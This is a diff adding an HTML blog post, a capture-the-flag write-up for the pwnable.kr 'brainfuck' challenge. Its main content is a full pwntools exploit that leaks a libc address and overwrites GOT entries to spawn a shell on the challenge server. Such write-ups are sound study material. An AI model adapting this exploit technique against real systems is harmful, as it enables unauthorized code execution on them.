@@ -1,0 +1,103 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Pwnable.kr - brainfuck &middot; M1r4c13</title>
+<meta name="description" content="Pwnable.kr - brainfuck -- M1r4c13 study notes, restored.">
+<link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 16 16'%3E%3Ccircle cx='8' cy='8' r='2.2' fill='%23d8c08a'/%3E%3Ccircle cx='8' cy='8' r='6.5' fill='none' stroke='%23d8c08a' stroke-opacity='.35' stroke-width='.8'/%3E%3C/svg%3E">
+<link rel="stylesheet" href="../blog.css">
+</head>
+<body>
+<header class="blog-head">
+<a class="mono back-link" href="/">xhyu@sky:~$ cd ~</a>
+<a class="brand brand-link" href="/blog/">M1r4c13</a>
+</header>
+<main><article class="post">
+<h1 class="post-title">Pwnable.kr - brainfuck</h1>
+<p class="meta"><span class="mono meta-date">2017.05.08</span><span class="tags"><span class="chip mono">pwnable.kr</span><span class="chip mono">ctf</span></span></p>
+<div class="post-body"><h5>Challenge</h5>
+<pre><code>I made a simple brain-fuck language emulation program written in C. 
+The [ ] commands are not implemented yet. However the rest functionality seems working fine. 
+Find a bug and exploit it to get a shell. 
+
+Download : http://pwnable.kr/bin/bf
+Download : http://pwnable.kr/bin/bf_libc.so
+
+Running at : nc pwnable.kr 9001
+</code></pre>
+<h5>Analyze</h5>
+<ul>
+<li>Brain**** is a ****ing lovely programming language like Whitespace, with only 8 operations: "&lt;&gt;-+.,[]", it's very interesting though.</li>
+<li>The point is to overwrite values in got.plt</li>
+<li>You need to find a way to execute system with parameter(s) to get the shell.</li>
+</ul>
+<h5>Solution</h5>
+<pre><code class="language-python">from pwn import *
+
+DEBUG=0
+if DEBUG == 1:
+  p=process('./bf')
+  libc = ELF('./bf_libc.so')
+else:
+  p=remote('pwnable.kr', 9001)
+  libc = ELF('./bf_libc.so')
+
+a_tape=0x0804a0a0
+a_main=0x08048671
+a_gotplt_fgets=0x0804a010
+a_gotplt_memset=0x0804a02c
+a_gotplt_putchar=0x0804a030
+
+global cp
+cp = a_tape # current position
+
+def mp(f, t): # move position (change p's value) payload
+  global cp
+  cp = cp + (t - f)
+  if t&gt;f:
+    return '&gt;'*(t-f)
+  else:
+    return '&lt;'*(f-t)
+
+write=',&gt;'*4 + '&lt;'*4
+leakandwrite='.&gt;'*4 + '&lt;'*4 + ',&gt;'*4 + '&lt;'*4
+
+payload = mp(cp, a_gotplt_fgets)
+payload += leakandwrite
+payload += mp(cp, a_gotplt_memset)
+payload += write
+payload += mp(cp, a_gotplt_putchar)
+payload += write
+payload += '.'
+
+print p.recvline_startswith('type')
+p.sendline(payload)
+
+a_fgets=int(p.recvn(4)[::-1].encode('hex'),16)
+a_gets=a_fgets+(libc.symbols['gets'] - libc.symbols['fgets'])
+a_system=a_fgets+(libc.symbols['system'] - libc.symbols['fgets'])
+
+p.send(p32(a_system))
+p.send(p32(a_gets))
+p.send(p32(a_main))
+p.sendline('/bin/sh')
+
+p.interactive()
+</code></pre>
+<ul>
+<li>Notice: when send addresses in the very last lines, you need to use send() rather than sendline()</li>
+<li>Also Notice: you can of cause read the 'actual' addresses inside got.plt from the binary you downloaded, but don't use those values cause they will change when the program starts to run. Instead, you should leak their values dynamicly with '.' operation.</li>
+</ul>
+<h5>References</h5>
+<p><a href="https://tuonilabs.wordpress.com/2016/12/08/pwnable-kr-rookiss-write-up/">Pwnable.kr – Rookiss Write-Up</a></p>
+<p><a href="https://systemoverlord.com/2017/03/19/got-and-plt-for-pwning.html">[systemoverlord.com] GOT and PLT for pwning.</a></p>
+<p><a href="http://www.airs.com/blog/archives/38">[Airs – Ian Lance Taylor] famous blog series about linker and loader</a></p>
+<p><a href="http://stackoverflow.com/questions/21617586/reverse-string-string-1-works-but-string0-1-and-others-dont">[stackoverflow] python [ : : -1]</a></p></div>
+</article></main>
+<footer class="blog-foot">
+ <p class="mono foot-line">m1r4c13 &middot; study notes &middot; 2017 to 2018 &middot; restored</p>
+ <p class="coda"><span class="cn-inline">世界并不完美，却令人着迷。</span></p>
+</footer>
+</body>
+</html>
